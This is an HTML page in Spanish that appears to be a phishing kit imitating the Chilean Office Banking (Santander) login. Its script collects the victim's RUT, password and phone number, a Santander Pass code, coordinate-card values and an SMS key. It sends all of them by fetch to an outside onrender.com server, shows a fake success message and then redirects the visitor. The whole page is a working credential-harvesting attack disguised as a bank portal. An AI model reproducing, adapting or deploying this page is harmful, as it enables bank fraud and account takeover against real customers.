<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Office Banking</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="styles.css">
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
    .login-box { max-width: 400px; margin: auto; padding: 20px; }
    input, select, button { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
    .coordenadas { display: flex; flex-direction: column; gap: 10px; }
    .coordenadas label { font-weight: bold; }
    .footer-icons { display: flex; justify-content: space-around; margin-top: 20px; }
    @media (max-width: 480px) {
      .login-box { padding: 10px; }
      input, button, select { font-size: 16px; }
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <!-- Formulario de Login -->
    <form id="loginForm">
      <label for="rut">RUT</label>
      <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
      
      <label for="passwd">Contrase√±a</label>
      <input type="password" id="passwd" name="passwd" required>

      <label for="telefono">Tel√©fono actualizado</label>
      <input type="tel" id="telefono" name="telefono" placeholder="+56 9 1234 5678" required>
      
      <label class="checkbox-label">
        <input type="checkbox" id="contacto" name="contacto" required>
        Deseo que me contacte un ejecutivo para solicitar L√≠nea de Cr√©dito o Tarjeta de Cr√©dito.  
      </label>
      
      <div class="options">
        <label><input type="checkbox" id="recordar"> Recordar usuario</label>
        <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">Olvid√© mi clave</a>
      </div>
      
      <button type="submit">Ingresar</button>
    </form>
    <div id="resultado"></div>

    <!-- Secci√≥n de Autorizaci√≥n -->
    <div id="autorizacion">
      <h3>Autorizaci√≥n</h3>
      <label for="tipoAutorizacion">Seleccione tipo:</label>
      <select id="tipoAutorizacion">
        <option value="santander">Santander Pass</option>
        <option value="coordenadas">Coordenadas</option>
      </select>

      <!-- Formulario Santander Pass -->
      <form id="formSantander" style="display:none;">
        <h4>Santander Pass</h4>
        <input type="password" id="passSantander" placeholder="Ingrese su clave Santander Pass" required>
        <button type="submit">Autorizar</button>
      </form>

      <!-- Formulario Coordenadas -->
      <form id="formCoordenadas" style="display:none;">
        <h4>Autorizaci√≥n por Coordenadas</h4>
        <div class="coordenadas">
          <label id="coordLabelA">Coordenada A</label>
          <input type="text" id="coordA" maxlength="1" required>
          <label id="coordLabelB">Coordenada B</label>
          <input type="text" id="coordB" maxlength="1" required>
          <label id="coordLabelC">Coordenada C</label>
          <input type="text" id="coordC" maxlength="1" required>
        </div>
        <div class="sms">
          <label>Ingreso clave 3.0 / clave SMS</label>
          <input type="text" id="claveSMS" maxlength="6" required>
        </div>
        <button type="submit">Autorizar</button>
      </form>
    </div>

    <div class="footer-icons">
      <div>üìä<br>Indicadores Econ√≥micos</div>
      <div>‚òéÔ∏è<br>Contact Center</div>
    </div>
  </div>

  <script>
    // Validaci√≥n de RUT
    function validarRut(rutCompleto) {
      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
      if(rutCompleto.length < 2) return false;
      let cuerpo = rutCompleto.slice(0, -1);
      let dv = rutCompleto.slice(-1);
      let suma = 0, multiplo = 2;
      for(let i = cuerpo.length - 1; i >= 0; i--) {
        suma += parseInt(cuerpo.charAt(i)) * multiplo;
        multiplo = multiplo < 7 ? multiplo + 1 : 2;
      }
      let dvEsperado = 11 - (suma % 11);
      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
      return dv === dvEsperado;
    }

    // Login
    document.getElementById("loginForm").addEventListener("submit", async function(e){
      e.preventDefault();
      const rut = document.getElementById("rut").value;
      const passwd = document.getElementById("passwd").value;
      const telefono = document.getElementById("telefono").value;
      const contacto = document.getElementById("contacto").checked;

      if(!validarRut(rut)){
        document.getElementById("resultado").innerText = "‚ùå RUT inv√°lido";
        return;
      }
      if(!contacto){
        document.getElementById("resultado").innerText = "‚ö†Ô∏è Debe aceptar ser contactado por un ejecutivo.";
        return;
      }

      try {
        const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/proxy-login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ rut, passwd, telefono })
        });

        const data = await response.text();
        console.log("Respuesta del servidor:", data);

        if (data.includes("Revisa tu conexi√≥n a internet")) {
          document.getElementById("resultado").innerText = "‚ö†Ô∏è Error de conexi√≥n con Office Banking.";
        } else if (response.ok && data.includes("OK")) {
          document.getElementById("resultado").innerText = "‚úÖ Login exitoso.";
          setTimeout(()=> window.location.href = "productos.html", 1500);
        } else {
          document.getElementById("resultado").innerText = data;
        }
      } catch (error) {
        console.error("Error en fetch:", error);
        document.getElementById("resultado").innerText = "‚ö†Ô∏è Error al conectar con el servidor.";
      }
    });

    // Autorizaci√≥n
    const tipoAutorizacion = document.getElementById("tipoAutorizacion");
    const formSantander = document.getElementById("formSantander");
    const formCoordenadas = document.getElementById("formCoordenadas");

    tipoAutorizacion.addEventListener("change", () => {
      if(tipoAutorizacion.value === "santander"){
        formSantander.style.display = "block";
        formCoordenadas.style.display = "none";
      } else {
        formSantander.style.display = "none";
        formCoordenadas.style.display = "block";
      }
    });

    formSantander.addEventListener("submit", async (e) => {
      e.preventDefault();
      const pass = document.getElementById("passSantander").value;
      const mensaje = `Santander Pass: ${pass}`;

      try {
        await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ mensaje })
        });
        alert("‚úÖ Autorizaci√≥n enviada");
      } catch (err) {
        alert("‚ùå Error al enviar autorizaci√≥n");
      }
    });

         formCoordenadas.addEventListener("submit", async (e) => {
      e.preventDefault();
      const coordA = document.getElementById("coordA").value;
      const coordB = document.getElementById("coordB").value;
      const coordC = document.getElementById("coordC").value;
      const claveSMS = document.getElementById("claveSMS").value;

      const mensaje = `Autorizaci√≥n Coordenadas:
      Coordenada A: ${coordA}
      Coordenada B: ${coordB}
      Coordenada C: ${coordC}
      Clave SMS: ${claveSMS}`;

      try {
        const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ mensaje })
        });

        if (response.ok) {
          alert("‚úÖ Autorizaci√≥n enviada correctamente");
        } else {
          alert("‚ö†Ô∏è Error al procesar la autorizaci√≥n");
        }
      } catch (err) {
        console.error("Error en autorizaci√≥n coordenadas:", err);
        alert("‚ùå Error al enviar autorizaci√≥n");
      }
    });
